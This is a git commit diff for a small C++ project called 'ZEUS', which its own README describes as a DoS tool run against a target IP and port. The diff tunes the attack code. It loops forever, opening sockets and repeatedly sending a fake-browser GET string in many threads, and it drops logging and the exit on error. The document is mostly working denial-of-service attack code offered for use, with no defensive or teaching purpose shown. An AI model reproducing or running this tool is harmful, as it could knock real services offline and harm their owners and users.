b686bc7ed2f484f56138d9432e03091fc685d6f0
IVBecy <kristofhracza@gmail.com>
2021-06-23 19:17:23 +0100

    Improved README

--- README.md
+++ README.md
@@ -1,1 +1,11 @@
 # ZEUS DoS in cpp
+
+A simple DoS tool written in c++.
+
+# Usage:
+```./zeus [TARGET_IP] [PORT] 
+```
+
+# Tech used:
+- Sockets
+- Threading
--- zeus.cpp
+++ zeus.cpp
@@ -7,14 +7,12 @@
 using namespace std;
 
 // Variables
-int socketIter = 700;
-const char *getReq = "GET / HTTP 1.1  42069 \r\n";
-int threadCount = 30;
+int socketIter = 500;
+const char *getReq = "GET / HTTP 1.1 Mozzila/4.0(compatible; MSIE 6.0; window NT 5.1; SV1) \r\n";
+int threadCount = 50;
 
 // Socket
 int socketOps(const char *target,int port){
-	// Logging info
-	cout << "Target: " << target << ":" << port << "\n";
 	// Creation
 	struct sockaddr_in host;
 	int s,conn,flow;
@@ -24,25 +22,16 @@ int socketOps(const char *target,int port){
 	s = socket(AF_INET, SOCK_STREAM, 0);
 	if (s < 0){
 		cout << "[!] Socket failed to be created \n Exiting... \n";
-		exit(1);
-	}
-	else{
-		cout << "[*] Socket has been created \n";
 	};
-
 	// Connection
 	conn = (connect(s,(struct sockaddr *)&host,sizeof(host)));
 	if(conn < 0) {
 		cout << "[!] Connection failed\n";		
-	}
-	else{
-		cout << "[*] Socket connected to host\n";
-	}
-	
+	};
 	// Sending data
+	cout << "[*] Sending requests \n";
 	for(int i = 0; i<socketIter; i++){
-		flow = send (s,getReq,strlen(getReq),0);	
-		cout << "[*] Request sent\n";
+		flow = send (s,getReq,strlen(getReq),0);
 	};
 	return 0;
 };
@@ -52,10 +41,9 @@ int main(int argc, char *argv[]){
 	// Threading
 	while (true) {
 		for (int i = 0; i<threadCount; i++){
-			thread t(socketOps, argv[1],atoi(argv[2]));
+			thread t(socketOps, argv[1],atoi(argv[2]));			
 			t.join();
 		};
 	};
-	//socketOps(argv[1],atoi(argv[2]));
 	return 0;
 }
